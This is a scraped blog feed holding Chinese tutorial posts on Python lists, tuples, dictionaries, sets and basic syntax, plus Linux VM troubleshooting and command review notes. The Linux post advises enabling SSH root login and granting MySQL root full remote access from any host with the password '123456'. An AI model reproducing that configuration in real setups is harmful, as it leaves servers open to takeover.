生成随机数的模块：random模块 #生成一个长度为10的随机数列表 #通过循环实现 import random #导入生成随机数的模块 list1 = [] #定义一个空列表 for i in range(10): list1.append(random.randint(20,100)) print(list1) #通过列表推导式实现 import random #导入生成随机数的模块 list2 = [random.randint(20,100) for i in range(10)] print(list2) 根据列表生成指定需求的列表 newlist = [Expression for var in list] price = [1000,800,600,750,900] sale = [int(i*0.5) for i in price] print(&quot;原价：&quot;,price) print(&quot;打折后：&quot;,sale) 从列表中选择符合条件的元素组成新的列表 newlist = [Expression for var in list if condition] price = [1000,800,600,750,900] sale = [i for i in price if i&gt;800] print(&quot;原价：&quot;,price) print(&quot;大于800元的：&quot;,sale) 8.二维列表的使用列表类似于一维数组；二维列表类似于二维数组 listname = [[元素1,...,元素n],...,[元素1,...,元素n]] 2、元组(tuple)和列表类似，把[]换成()。且不能对单个元素像列表那样直接修改。 (元素1,元素2,...,元素n) 列表是不可变序列，元组可以放入：整数、实数、布尔值、字符串、序列、对象1.元组的创建和删除创建元组（1）使用赋值运算符直接创建元组 tuplename = (元素1,元素2,...,元素n) &gt;&gt;&gt; verse1 = (&quot;我学Pyhon&quot;) &gt;&gt;&gt; print(verse1,type(verse1)) 我学Pyhon &lt;class &#39;str&#39;&gt; &gt;&gt;&gt; verse2 = (&quot;我学Pyhon&quot;,) &gt;&gt;&gt; print(verse2,type(verse2)) (&#39;我学Pyhon&#39;,) &lt;class &#39;tuple&#39;&gt; （2）创建空元组 tuplename = () （3）创建数值元组 tuplename = (数值1,数值2,...,数值n) #跳一跳 &gt;&gt;&gt; tuple(range(2,21,2)) (2, 4, 6, 8, 10, 12, 14, 16, 18, 20) 删除元组 del tuplename 2.访问元组元素和列表类似。3.修改元组元素不能对单个元素像列表那样利用索引值直接修改。 coffeename = (&#39;蓝山&#39;,&#39;卡布奇诺&#39;,&#39;摩卡&#39;,&#39;麝香猫&#39;) print(&quot;我是原来的&quot;,coffeename) coffeename = (&#39;蓝山&#39;,&#39;卡布奇诺&#39;,&#39;摩卡&#39;,&#39;拿铁&#39;) print(&quot;我是修改后的&quot;,coffeename) newcoffeename = (&#39;麝香猫&#39;,) allcoffeename = coffeename + newcoffeename print(&quot;我是添加后的&quot;,allcoffeename) 4.元组推导式快速生成元组。类似于列表推导式 tuple = (Expression for var in range) import random #导入生成随机数的模块 tuple1 = (random.randint(20,100) for i in range(10)) print(tuple1) 得到生成器对象 import random #导入生成随机数的模块 tuple1 = (random.randint(20,100) for i in range(10)) print(tuple(tuple1)) #使用tuple()函数进行转换 使用tuple()函数进行转换，得到元组输出元组元素的值 #通过for循环 import random #导入生成随机数的模块 tuple1 = (random.randint(20,100) for i in range(10)) for i in tuple1: print(i,end=&#39; &#39;) #通过__next__()方法 import random #导入生成随机数的模块 tuple1 = (random.randint(20,100) for i in range(10)) #print(tuple1.__next__()) #输出第1个元素 #print(tuple1.__next__()) #输出第2个元素 #...... for j in range(10): print(tuple1.__next__(),end=&#39; &#39;) 对生成器对象访问之后，生成器对象就不存在了。若还想使用生成器对象，需要重新生成 import random #导入生成随机数的模块 tuple1 = (random.randint(20,100) for i in range(10)) print(tuple(tuple1)) #通过for循环 for i in tuple1: print(i,end=&#39; &#39;) 5.元组与列表的区别相同点：（1）都属于序列。（2）都可以按照一定的顺序存放一组元素，且元素类型不受限制。 不同点：（1）列表属于可变序列(随时添加、修改或删除)；元组属于不可变序列(不能添加、修改和删除元素，可以整体替换)。（2）都支持切片操作。列表可以访问、修改元组中的元素；元组只能访问元组中的元素。（3）列表访问速度慢；元组访问速度快。（4）列表不能作为字典的键；元组可以作为字典的键。 3、字典(dictionary)键-&gt;下标字典是可变序列 dictionary = {&#39;key1&#39;:&#39;value1&#39;,&#39;key2&#39;:&#39;value2&#39;,...,&#39;keyn&#39;:&#39;valuen&#39;} key必须唯一，value可以不唯一。1.字典的创建和删除创建字典（1）创建字典的四种方式方式一： &gt;&gt;&gt; dictionary = {&#39;che&#39;:&#39;车&#39;,&#39;chen&#39;:&#39;陈&#39;,&#39;chi&#39;:&#39;吃&#39;,&#39;cheng&#39;:&#39;称&#39;} &gt;&gt;&gt; print(dictionary) {&#39;che&#39;: &#39;车&#39;, &#39;chen&#39;: &#39;陈&#39;, &#39;chi&#39;: &#39;吃&#39;, &#39;cheng&#39;: &#39;称&#39;} 方式二： &gt;&gt;&gt; dictionary = dict(che = &#39;车&#39;,chen = &#39;陈&#39;,chi = &#39;吃&#39;,cheng = &#39;称&#39;) &gt;&gt;&gt; print(dictionary) {&#39;che&#39;: &#39;车&#39;, &#39;chen&#39;: &#39;陈&#39;, &#39;chi&#39;: &#39;吃&#39;, &#39;cheng&#39;: &#39;称&#39;} 方式三： key = [&#39;che&#39;,&#39;chen&#39;,&#39;chi&#39;,&#39;cheng&#39;] #音节索引列表 value = [&#39;车&#39;,&#39;陈&#39;,&#39;吃&#39;,&#39;称&#39;] #汉字列表 zip1 = zip(key,value) #转换为zip对象 #zip()函数可以把两个列表对应位置的元素组合为一个元组，并且返回一个zip对象 print(zip1) word = dict(zip1) #转换为字典 print(word) 方式四： key = (&#39;che&#39;,&#39;chen&#39;,&#39;chi&#39;,&#39;cheng&#39;) #音节索引元组 #key = [&#39;che&#39;,&#39;chen&#39;,&#39;chi&#39;,&#39;cheng&#39;] 错误，列表不能作为字典的键 value = [&#39;车&#39;,&#39;陈&#39;,&#39;吃&#39;,&#39;称&#39;] #汉字列表 dictionary = {key:value} print(dictionary) （2）创建空字典 &gt;&gt;&gt; word1 = {} &gt;&gt;&gt; print(word1) {} &gt;&gt;&gt; word2 = dict() &gt;&gt;&gt; print(word2) {} （3）使用dict的fromkeys()方法，创建值为空的字典 key = [&#39;che&#39;,&#39;chen&#39;,&#39;chi&#39;,&#39;cheng&#39;] dictionary = dict.fromkeys(key) print(dictionary) 删除字典 #删除字典 del dictionary #清除字典中的所有元素 dictionary.clear() 2.通过键值对访问字典（1）dict[键] key = [&#39;che&#39;,&#39;chen&#39;,&#39;chi&#39;,&#39;cheng&#39;] #音节索引列表 value = [&#39;车&#39;,&#39;陈&#39;,&#39;吃&#39;,&#39;称&#39;] #汉字列表 dictionary = dict(zip(key,value)) #转换字典 print(dictionary[&#39;che&#39;] if &#39;chei&#39; in dictionary else &#39;字典里没有这个字！&#39;) （2）get()方法 dictionary.get(key,[default]) key = [&#39;che&#39;,&#39;chen&#39;,&#39;chi&#39;,&#39;cheng&#39;] #音节索引列表 value = [&#39;车&#39;,&#39;陈&#39;,&#39;吃&#39;,&#39;称&#39;] #汉字列表 dictionary = dict(zip(key,value)) #转换字典 print(dictionary.get(&#39;che&#39;,&#39;查无此字&#39;)) #指定的键不存在时，不会抛出异常，返回None(指定默认值则返回默认值) 3.遍历字典 dictionary = {&#39;che&#39;:&#39;车&#39;,&#39;chen&#39;:&#39;陈&#39;,&#39;chi&#39;:&#39;吃&#39;,&#39;cheng&#39;:&#39;称&#39;} #输出可遍历的元组列表 print(dictionary.items()) #items()方法，返回可遍历的元组列表，每个元组即是键和值 print(&quot;\\n&quot;) #通过for循环，输出每个元组 for item in dictionary.items(): print(item) print(&quot;\\n&quot;) #通过for循环，输出键和值 for key,value in dictionary.items(): print(key,&quot;的汉字是&quot;,value) print(&quot;\\n&quot;) #输出键 for key in dictionary.keys(): print(key) print(&quot;\\n&quot;) #输出值 for value in dictionary.values(): print(value) 4.添加、修改和删除字典元素添加字典元素 dictionary[key] = value 修改字典元素 dictionary[key] = value 删除字典元素 del dictionary[key] dictionary = {&#39;che&#39;:&#39;车&#39;,&#39;chen&#39;:&#39;陈&#39;,&#39;chi&#39;:&#39;吃&#39;,&#39;cheng&#39;:&#39;称&#39;} print(&quot;原字典：&quot;,dictionary) dictionary[&quot;wang&quot;] = &quot;王&quot; #添加元素 print(&quot;添加后：&quot;,dictionary) dictionary[&quot;wang&quot;] = &quot;网&quot; #修改元素 print(&quot;修改后：&quot;,dictionary) del dictionary[&quot;wang&quot;] #删除元素 print(&quot;删除后：&quot;,dictionary) 5.字典推导式与列表推导式类似 {键值表达式:值表达式 for循环} import random #导入生成随机数的模块 randomdict = {i:random.randint(20,100) for i in range(10)} print(randomdict) 4、集合(set)可变集合set；不可变集合frozenset。用于保存不重复元素，最好的应用是去重。不支持索引集合是可变序列 set = {元素1,元素2,...,元素n} 1.集合的创建（1）使用赋值运算符直接创建集合 setname = {元素1,元素2,...,元素n} &gt;&gt;&gt; python = {&quot;小明&quot;,&quot;赵四&quot;,&quot;小赵&quot;,&quot;李明&quot;,&quot;张张&quot;,&quot;李华&quot;,&quot;王强&quot;} #选择pyhon学生名字集合 &gt;&gt;&gt; print(python,type(python)) {&#39;小明&#39;, &#39;李华&#39;, &#39;李明&#39;, &#39;小赵&#39;, &#39;王强&#39;, &#39;赵四&#39;, &#39;张张&#39;} &lt;class &#39;set&#39;&gt; （2）创建空集合 #创建空集合 setname = set() set()还可以将列表、元组等可迭代对象转换为集合2.集合的添加和删除添加元素 setname.add(element) #element不能是列表、元组等可迭代对象 删除元素（1）删除一个指定元素：remove() setname.remove(元素名称) （2）随机删除一个元素：pop() setname.pop() （3）删除全部元素：clear() setname.clear() 删除集合 del setname 3.集合的交集、并集和差集运算 python = {&quot;小明&quot;,&quot;赵四&quot;,&quot;小赵&quot;,&quot;李明&quot;,&quot;王强&quot;} #选择Pyhon学生名字集合 java = {&quot;赵四&quot;,&quot;小赵&quot;,&quot;张张&quot;,&quot;李华&quot;} #选择Java学生名字集合 print(&quot;选择Pyhon学生名字:&quot;,python) print(&quot;选择Java学生名字:&quot;,java) print(&quot;交集运算&quot;,python &amp; java) #既选择Pyhon又选择Java学生名字 print(&quot;并集运算&quot;,python | java) #参与选课的全部学生名字 print(&quot;差集运算&quot;,python - java) #选择Python但没有选择Java学生名字 5、列表、元组、字典、集合的区别 后记学习Python序列的应用(列表、元组、字典、集合)之后，了解并练习了列表、元组、字典、集合的一些常用操作。感觉收获很大，继续学习@_@","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://qwzf.github.io/categories/编程开发/"},{"name":"Python","slug":"编程开发/Python","permalink":"https://qwzf.github.io/categories/编程开发/Python/"}],"tags":[{"name":"序列的应用","slug":"序列的应用","permalink":"https://qwzf.github.io/tags/序列的应用/"},{"name":"列表","slug":"列表","permalink":"https://qwzf.github.io/tags/列表/"},{"name":"元组","slug":"元组","permalink":"https://qwzf.github.io/tags/元组/"},{"name":"字典","slug":"字典","permalink":"https://qwzf.github.io/tags/字典/"},{"name":"集合","slug":"集合","permalink":"https://qwzf.github.io/tags/集合/"}],"author":"qwzf"},{"title":"Python学习-基础篇(一)","slug":"Python学习-基础篇(一)","date":"2020-01-16T14:29:30.000Z","updated":"2020-08-01T15:47:40.838Z","comments":true,"path":"2020/01/16/Python学习-基础篇(一)/","link":"","permalink":"https://qwzf.github.io/2020/01/16/Python学习-基础篇(一)/","excerpt":"","text":"前言闲来无事，开启Python学习之旅！我分为以下几部分进行学习：开发工具、基本语法、流程控制、序列的应用(列表、元组、字典、集合、字符串)、字符串及正则表达式、函数、面向对象程序设计、模块、异常处理及程序调试、文件及目录操作、操作数据库、网络爬虫、脚本编写、Web框架。本篇包含：开发工具、基本语法、流程控制 一、Python开发工具1、自带的IDLE2、常用的第三方开发工具：PyCharm、Anaconda、Visual Studio 2017、Eclipse+PyDev自带IDLE的常用快捷键： 二、Python基本语法1、语法特点1.注释（1）单行注释 # 注释内容 （2）多行注释 &#39;&#39;&#39; 注释形式1 注释内容 ...... &#39;&#39;&#39; &quot;&quot;&quot; 注释形式2 注释内容 ...... &quot;&quot;&quot; （3）中文编码声明注释 # _*_ coding:编码 _*_ #coding=编码 编码：utf-8、gbk2.代码缩进一个缩进量：一个Tab或4个空格推荐采用空格。注：同一个级别的代码块的缩进量必须相同。如果不采用合理的代码缩进，将抛出SyntaxError异常。3.编码规范采用PEP 8编码规范 每个import语句只导入一个模块，尽量避免一次导入多个模块。不要在行尾添加分号;，也不要用分号将两条命令放在同一行。建议每行不超过80个字符。(可以用()换行连接)使用必要的空行可以增加代码的可读性。(函数和类的定义空2行，方法的定义空1行)运算符两侧、函数参数之间、逗号,两侧建议使用空格进行分割。避免在循环中使用+和+=运算符累加字符串。适当使用异常处理结构提高程序容错性。 命名规范 模块名尽量短小，并且使用全部小写字母，可以使用_分隔多个字母。包名尽量短小，并且使用全部小写字母。类名采用单词首字母大写形式(即Pascal风格)。模块内部的类由_+Pascal风格的类名组成。函数、类的属性和方法名全部采用小写字母，多个字母间用_分隔。常量命名时采用全部大写字母，可以使用_。使用_开头的模块变量或函数是受保护的。使用__开头的实例变量或方法是类私有的。 2、保留字与标识符1.保留字Python 3.6版有33个保留字(关键字)，Python 3.7版本中正式引入两个新的关键字async与await，共35个关键字。保留字是区分字母大小写的。 import keyword print(keyword.kwlist) --- Python 3.6 Console Output --- [&#39;False&#39;, &#39;None&#39;, &#39;True&#39;, &#39;and&#39;, &#39;as&#39;, &#39;assert&#39;, &#39;break&#39;, &#39;class&#39;, &#39;continue&#39;, &#39;def&#39;, &#39;del&#39;, &#39;elif&#39;, &#39;else&#39;, &#39;except&#39;, &#39;finally&#39;, &#39;for&#39;, &#39;from&#39;, &#39;global&#39;, &#39;if&#39;, &#39;import&#39;, &#39;in&#39;, &#39;is&#39;, &#39;lambda&#39;, &#39;nonlocal&#39;, &#39;not&#39;, &#39;or&#39;, &#39;pass&#39;, &#39;raise&#39;, &#39;return&#39;, &#39;try&#39;, &#39;while&#39;, &#39;with&#39;, &#39;yield&#39;] --- Python 3.7 Console Output --- [&#39;False&#39;, &#39;None&#39;, &#39;True&#39;, &#39;and&#39;, &#39;as&#39;, &#39;assert&#39;, &#39;async&#39;, &#39;await&#39;, &#39;break&#39;, &#39;class&#39;, &#39;continue&#39;, &#39;def&#39;, &#39;del&#39;, &#39;elif&#39;, &#39;else&#39;, &#39;except&#39;, &#39;finally&#39;, &#39;for&#39;, &#39;from&#39;, &#39;global&#39;, &#39;if&#39;, &#39;import&#39;, &#39;in&#39;, &#39;is&#39;, &#39;lambda&#39;, &#39;nonlocal&#39;, &#39;not&#39;, &#39;or&#39;, &#39;pass&#39;, &#39;raise&#39;, &#39;return&#39;, &#39;try&#39;, &#39;while&#39;, &#39;with&#39;, &#39;yield&#39;] 2.标识符_标识符 保护变量__标识符 类的私有成员__标识符__ 专用标识(如：__init__()构造函数) 3、变量不需要提前声明，直接赋值使用即可type()可以查看变量类型id()可以获取变量的内存地址 &gt;&gt;&gt; name = &quot;qwzf&quot; &gt;&gt;&gt; print(name) qwzf &gt;&gt;&gt; age = 20 &gt;&gt;&gt; print(age) 20 &gt;&gt;&gt; type(name) &lt;class &#39;str&#39;&gt; &gt;&gt;&gt; type(age) &lt;class &#39;int&#39;&gt; 多个变量指向同一个值时，在内存中就只存在一个值。 &gt;&gt;&gt; num = count = 1024 &gt;&gt;&gt; print(num) 1024 &gt;&gt;&gt; print(count) 1024 &gt;&gt;&gt; id(num) 2179811900336 &gt;&gt;&gt; id(count) 2179811900336 &gt;&gt;&gt; 变量命名规则： 必须是一个有效的标识符选择有意义的单词不能使用Python中的保留字慎用小写字母l和大写字母O 4、基本数据类型基本数据类型有：数字类型、字符串类型、布尔类型1.数字类型数字类型：整数、浮点数、复数浮点数计算时，可能会出现小数位数不确定的情况。要用到函数round()进行小数位数保留。 &gt;&gt;&gt; 0.1+0.2 0.30000000000000004 &gt;&gt;&gt; round(0.1+0.2,1) 0.3 &gt;&gt;&gt; 2.字符串类型使用单引号和双引号，内容必须写在一行上；使用三引号，内容可以分多行写。 text1 = &#39;学习Pyhon&#39; #使用单引号 text2 = &quot;学习编程&quot; #使用双引号 text3 = &#39;&#39;&#39;继续学习中， 请勿打扰&#39;&#39;&#39; #使用三引号 字符串类型，有时会用到转义字符\\3.布尔类型假值：（1）False或None（2）0、0.0、虚数0（3）空序列(空字符串、空元组、空列表、空字典)（4）对象的__bool__方法返回False或者__len__方法返回0真值：除上述返回假值的情况外，都是返回真值4.数据类型转换int()强制转换成整型float()强制转换成浮点型str()强制转换成字符串型hex()强制将整数转换为16进制字符串oct()强制将整数转换为8进制字符串 &gt;&gt;&gt; num = 100.25 &gt;&gt;&gt; num1 = str(num) &gt;&gt;&gt; print(num1) 100.25 &gt;&gt;&gt; type(num1) &lt;class &#39;str&#39;&gt; &gt;&gt;&gt; num2 = int(num) &gt;&gt;&gt; print(num2) 100 5、运算符运算符包含：算术运算符、赋值运算符、比较(关系)运算符、逻辑运算符、位运算符1.算术运算符+、-、*、/取整除：//(向下取整)取余：%幂次：**2.赋值运算符简单赋值 =加法赋值 +=减法赋值 -=乘法赋值 *=除法赋值 /=取整除赋值 //=取余赋值 %=幂赋值 **=3.比较(关系)运算符等于 ==不等于 != 或 &lt;&gt;(a != b 或 a &lt;&gt; b)大于 &gt;小于 &lt;大于等于 &gt;=小于等于 &lt;=4.逻辑运算符逻辑运算符返回值为true 或 false。布尔与 and ：如果 x 为 False，x and y 返回 False，否则它返回 y 的计算值。。布尔或 or ：如果 x 是非 0，它返回 x 的值，否则它返回 y 的计算值。布尔非 not ： 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。5.位运算符位运算过程中，把数字转化成二进制计算，然后再转化成数字。按位与 &amp; ：参与运算的两个值,如果两个相应位都为1,则该位的结果为1,否则为0。按位或 |：参与运算的两个值, 只要有一个位置为1，则该位的结果为1。按位异或 ^ ：参与运算的两个值,如果两个相应位数值不同，则结果为1，若相同，则结果为0.按位取反 ~ ：对数据的每个二进制位取反,即把1变为0,把0变为1 。左移位 &lt;&lt; ：若 a &lt;&lt; 2 将数字a对应的二进制数集体向左移动2位，后面空余的2位补零。(例：原a二进制：0011 1100, a &lt;&lt; 2 ,得 1111 0000，加黑为补零位。)右移位 &gt;&gt; ：若 a &gt;&gt; 3 将数字a对应的二进制数集体向右移动2位，前面空余的2位补零。(例：原a二进制：0011 1100, a &gt;&gt; 2 ,得 0000 1111，加黑为补零位。)6.成员运算符检测 x 是否在 y 的序列中。in ：若 x 在 y 的序列中，则返回True，否则返回False。not in ：若 x 不在 y 的序列中，则返回True，否则返回False。7.身份运算符用于比较两个对象 A 和 B 的存储单元是否一致，即判断两个标识符 A 和 B 是不是引用自一个对象。is ： x is y, 类似 id(x) == id(y) , 如果引用的是同一个对象则返回 True，否则返回 False。 # id() 函数用于获取对象内存地址。is not ： x is not y ， 类似 id(a) != id(b)。如果引用的不是同一个对象则返回结果 True，否则返回 False。 # id() 函数用于获取对象内存地址。8.运算符的优先级 6、基本输入和输出1.input()函数输入input()函数返回值是字符串类型 variable = input(&quot;提示文字&quot;) 返回值类型转换 &gt;&gt;&gt; tips = input(&quot;请输入内容：&quot;) 请输入内容：123 &gt;&gt;&gt; print(tips,type(tips)) 123 &lt;class &#39;str&#39;&gt; &gt;&gt;&gt; hints = int(input(&quot;请输入内容：&quot;)) 请输入内容：456 &gt;&gt;&gt; print(hints,type(hints)) 456 &lt;class &#39;int&#39;&gt; 2.print()函数输出 print(输出内容) a = 6 b = 111 print(&quot;数字：&quot;,666) print(&quot;表达式：&quot;,a*b) print(&quot;字符串：&quot;,&quot;努力吧！！&quot;) 输出到文件 fp = open(r&#39;D:\\demo.txt&#39;,&#39;a+&#39;) print(&quot;加油！奥利给！！&quot;,file = fp) fp.close() 在一行输出 for i in range(1,10): print(i,end=&#39; &#39;) 三、流程控制1、选择语句1.简单的if语句 if 表达式: 语句块 2.if…else语句 if 表达式: 语句块1 else: 语句块2 3.if…elif…else语句 if 表达式1: 语句块1 elif 表达式2: 语句块2 ...... else: 语句块n 如果已经定义一个布尔变量flag，if语句应写成以下形式： if flag: if not flag: 下面这种形式是不规范的： if flag == True:(X) 4.if语句的嵌套 if 表达式1: if 表达式2: 语句块2 else: 语句块3 else: 语句块1 2、条件表达式好处：使代码简洁；可以有一个返回值 结果1 if 表达式 else 结果2 表达式为真，返回结果1；表达式为假，返回结果2通常把结果赋值给一个变量 #求两个数的最大值 a = 10 b = 20 r = a if a&gt;b else b print(r) #求一个数的绝对值 x = -10 y = x if a&gt;0 else -x 3、循环语句1.while循环一直重复，直到条件不满足时，才停止 while 条件表达式: 循环体 2.for循环重复一定次数，通常用于迭代、枚举或遍历 for 迭代变量 in 对象: 循环体 循环数值 #计算1+2+...+100的和 result = 0 #保存累加结果的变量 for i in range(101): result += i #实现累加 print(result) 遍历字符串 string = &#39;努力不一定成功&#39; for ch in string: print(ch) range()函数：生成一系列连续的整数range(start,end,step)start: 计数从start开始。默认是从 0 开始。例如：range(5)等价于range(0,5)end: 计数到end结束，但不包括 stop。例如：range(0,5)是[0, 1, 2, 3, 4]没有5step：步长，默认为1。例如：range(0,5)等价于range(0,5,1) range()函数替换Python2中的xrange()函数3.循环嵌套 while 条件表达式1: while 条件表达式2: 循环体2 循环体1 while 条件表达式: for 迭代变量 in 对象: 循环体2 循环体1 for 迭代变量 in 对象: while 条件表达式: 循环体2 循环体1 等等 4、跳转语句1.break语句完全跳出循环2.continue语句只跳出一次循环，然后继续下一次循环 5、pass空语句pass语句，表示空语句。它不做任何事情，一般起到占位作用。通常用于流程控制语句、函数、类中。 for i in range(1,10): if i%2 == 0: print(i,end=&#39;,&#39;) #输出偶数 else: pass #占位，不做任何事 后记学习完Python的开发工具、基本语法、流程控制，对Python的一些语法有了一些认识。收获之处：学习了流程控制中条件表达式和for循环的使用。同时注意到Python中没有do…while循环。继续学习@_@","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://qwzf.github.io/categories/编程开发/"},{"name":"Python","slug":"编程开发/Python","permalink":"https://qwzf.github.io/categories/编程开发/Python/"}],"tags":[{"name":"基本语法","slug":"基本语法","permalink":"https://qwzf.github.io/tags/基本语法/"},{"name":"流程控制","slug":"流程控制","permalink":"https://qwzf.github.io/tags/流程控制/"},{"name":"开发工具","slug":"开发工具","permalink":"https://qwzf.github.io/tags/开发工具/"}],"author":"qwzf"},{"title":"Linux虚拟机常见使用及常见问题","slug":"Linux虚拟机常见使用及常见问题","date":"2020-01-07T08:08:02.142Z","updated":"2020-08-01T15:53:34.348Z","comments":true,"path":"2020/01/07/Linux虚拟机常见使用及常见问题/","link":"","permalink":"https://qwzf.github.io/2020/01/07/Linux虚拟机常见使用及常见问题/","excerpt":"","text":"前言Linux使用过程中经常遇到一些问题，于是总结一下。 一、ubantu不显示和不能用本地ip解决方法： sudo dhclient ens33 sudo ifconfig ens33 二、ubantu解决“无法获得锁”现象一：E: 无法获得锁 /var/lib/dpkg/lock - open (11: 资源暂时不可用)在ubuntu系统的termial下，用apt-get install 安装软件的时候，如果在未完成下载的情况下将terminal close。此时 apt-get进程可能没有结束，而Linux只允许开一个apt-get。结果，如果再次运行apt-get install 命令安装如今，可能会发生下面的提示： 无法获得锁 /var/lib/dpkg/lock - open (11: 资源暂时不可用)无法锁定管理目录(/var/lib/dpkg/)，是否有其他进程正占用它？ 解决方法一：终端输入 ps aux|grep apt ，列出进程。找到含有apt-get的，直接sudo kill PID。如：sudo kill -9 PID 解决方法二：强制解锁,命令 sudo rm /var/lib/dpkg/lock 或 sudo rm /var/lib/apt/lists/lock 现象二：E: 无法获得锁 /var/cache/apt/archives/lock - open (11 资源临时不可用) E: 无法获得锁 /var/cache/apt/archives/lock - open (11 资源临时不可用)E: 无法锁定下载目录 解决方法一：1、命令：ps -aux | grep apt-get 列出进程2、找到最后一列以apt-get 开头的进程命令：sudo kill 该进程的PID解决方法二： sudo rm /var/cache/apt/archives/lock sudo rm /var/lib/dpkg/lock 三、配置桥接网络，静态ip1、配置VMware虚拟机的网络适配器为桥接模式2、首先输入命令：vi /etc/network/interfaces，配置ip信息3、重启网卡：service networking restart输入ifconfig发现配置成功4、DNS域名解析服务器配置：vi /etc/resolv.conf /etc/resolv.conf它是DNS客户机配置文件，用于设置DNS服务器的IP地址及DNS域名，还包含了主机的域名搜索顺序。该文件是由域名解析器（resolver，一个根据主机名解析IP地址的库）使用的配置文件。它的格式很简单，每行以一个关键字开头，后接一个或多个由空格隔开的参数。resolv.conf的关键字主要有四个，分别是： nameserver #定义DNS服务器的IP地址domain #定义本地域名search #定义域名的搜索列表sortlist #对返回的域名进行排序 下面我们给出一个/etc/resolv.conf的示例： domain 51osos.comsearch 51osos.comnameserver 202.102.192.68nameserver 202.102.192.69 最主要是nameserver关键字，如果没指定nameserver就找不到DNS服务器，其它关键字是可选的。这里写nameserver关键字即可5、重启网卡：service networking restart测试：ping www.baidu.com6、查看内网存活主机：nmap -sn 192.168.1.1-255 四、使用ssh以root用户直接登录出于安全考虑，ubuntu默认不允许root远程登录解决方案：1、安装openssh软件 sudo apt install -y openssh-server 2、编辑SSH文件 sudo nano /etc/ssh/sshd_config 将PermitRootLogin 的值改为yes 将PermitEmptyPasswords 的值改为no 3、重启ssh服务 service ssh restart 4、重新登录，就可以以root用户直接登录ssh。 五、Ubuntu下搭建LAMP环境以及安装nginx服务器参考：Ubuntu18.04下搭建LAMP环境ubantu lamp环境安装Ubuntu 16.04搭建LAMP开发环境 ubantu下搭建php5.6+nginx+mysql开发环境ubantu-nginx部署ubuntu16.04安装nginx教程Ubuntu18.04搭建nginx服务器 六、MySQL设置密码并允许远程登录进入MySQL命令行并定位到mysql mysql -u root -p #没有密码的话直接回车 use mysql 输入修改语句 update user set password=password(&quot;123456&quot;) where user=&quot;root&quot;; 上述语句修改密码为123456 ;然后会显示Query OK;证明改密成功。刷新MySQL的系统权限相关表 flush privileges;­ 问题1：在docker容器内访问宿主机mysql报：Error 1045: Access denied for user ‘root’@’x.x.x.x’ (using password: YES)出错原因：1、密码输入错误;2、-u后边跟的用户不存在；3、权限原因导致（我的就是这个原因）针对这种原因的解决方法如下： grant all privileges on *.* to root@&#39;%&#39; identified by &#39;123456&#39; with grant option; flush privileges; exit 后记大致就先总结那么多，持续更新中。。。。。","categories":[{"name":"运维","slug":"运维","permalink":"https://qwzf.github.io/categories/运维/"},{"name":"Linux基础","slug":"运维/Linux基础","permalink":"https://qwzf.github.io/categories/运维/Linux基础/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://qwzf.github.io/tags/Linux/"},{"name":"问题整理","slug":"问题整理","permalink":"https://qwzf.github.io/tags/问题整理/"}],"author":"qwzf"},{"title":"Linux基础期末整理复习","slug":"Linux基础期末整理复习","date":"2019-12-26T08:50:43.000Z","updated":"2020-08-01T15:09:59.349Z","comments":true,"path":"2019/12/26/Linux基础期末整理复习/","link":"","permalink":"https://qwzf.github.io/2019/12/26/Linux基础期末整理复习/","excerpt":"","text":"一、常用命令1、目录操作命令1.查看当前目录：pwd命令提示符由哪几部分组成：命令名 [选项][参数]2.查看目录：ls -alls -l 长格式显示ls -a 显示所有文件（包含隐藏文件）ls -alls -h 以常用单位显示文件大小ls -d 只显示目录，不显示目录下子文件ls -i 显示文件 inode 号ls -l 文件名隐藏文件名特点：文件名前面都有个带点的符号;显示的每一条信息各部分的含义：权限位 引用计数 属主 属组 大小 最后一次修改时间 文件名 3.切换目录：cd 目录名使用cd命令切换到上一层目录 使用绝对路径的方式切换到上层目录：cd 具体路径使用相对路径的方式切换到上层目录：cd ..“ .. ”表示上一级目录；“ .”表示当前目录。 4.创建目录：mkdir 目录名使用mkdir命令在用户主目录下分别使用绝对路径和相对路径的方式创建一个newdir目录在root目录下进行操作命令分别为：mkdir /root/newdirmkdir ./newdir5.删除目录：rmdir 目录名||rm 目录名||rm -rf 目录名使用rmdir命令删除刚才创建的newdir目录rm newdir（只能删空目录）；rm –rf newdir 2、文件操作命令1.创建空文件：touch 文件名2.删除文件：rm -rf 文件名3.查看文件内容：cat 文件名4.分屏显示文件内容：more 文件名5.分行显示文件内容：less 文件名6.显示文件头：head 文件名head -n 行数 文件名 指定显示文件头几行7.显示文件尾：tail -n 行数 文件名 3、目录和文件操作命令1.删除文件或目录：rm ||rm -rf2.复制文件或目录：cp 源文件 目标位置-r 复制目录-p 连带文件属性复制-d 若源文件是链接文件，则复制链接属性-a 相当于 -pdr 可进行原名复制和改名复制3.移动或重命名文件或目录：mv 源文件 目标位置4.链接文件硬链接：ln 源文件 目标文件可以看作是同一个文件进行复制 不能跨分区不能针对目录使用 软链接：ln -s 源文件 目标文件文件名都必须写绝对路径类似 于Windows 快捷方式 软链接文件权限都为 rwxrwxrwx修改任意文件，另一个都改变删除原文件，软链接不能使用 4、权限管理1.权限位-rw-r–r– 1 root root 0 08-11 01:45 aa属主权限 u 属组权限 g 其他人权限 o权限对文件的含义r 读：读取文件内容 cat more head tail 4w 写：编辑、新增、修改文件内容(但是不包含删除文件) vi echo 2x 执行：可执行 1权限对目录的含义r：可以查询目录下文件名 lsw：具有修改目录结构的权限 touch rm mv cpx：可以进入目录 cd 2.修改权限chmod u+x aa aa文件的属主加上执行权限chmod u-x aa aa文件的属主减去执行权限chmod g+w,o+w aa aa文件的属组和其他人加上写权限chmod u=rwx aa aa文件的属主赋读写和执行权限chmod 755 aachmod 644 aa文件和目录默认权限：umask0022文件： 666 022 644目录： 777 022 7553.属主和属组命令chown 用户名 文件名 改变文件属主chown 用户名:属组名 文件名 改变属主同时改变属组 useradd 用户名 添加用户passwd 用户名 设定用户密码 chgrp 属组名 文件名 改变属组 5、帮助命令man 命令名 查看命令的帮助help 内部命令 查看内部命令帮助命令 --help 查看命令的常见选项info 命令 进入子帮助页面(带有*号标记) 6、查找命令which 命令名 查找命令的命令，能看到相关别名whereis 命令名 查找命令的命令，同时看到帮助文档位置locate 文件名 按照文件名查找 按照数据库查找 updatedb强制更新数据库 1.find 查找位置 -name 文件名 按照文件名查找按照时间查找-ctime 按照文件状态修改时间（天） change-mtime 按照文件数据修改时间 modify-atime 按照访问时间 access如：find / -ctime +4 按照用户-uid 数字 按照用户属主 ID 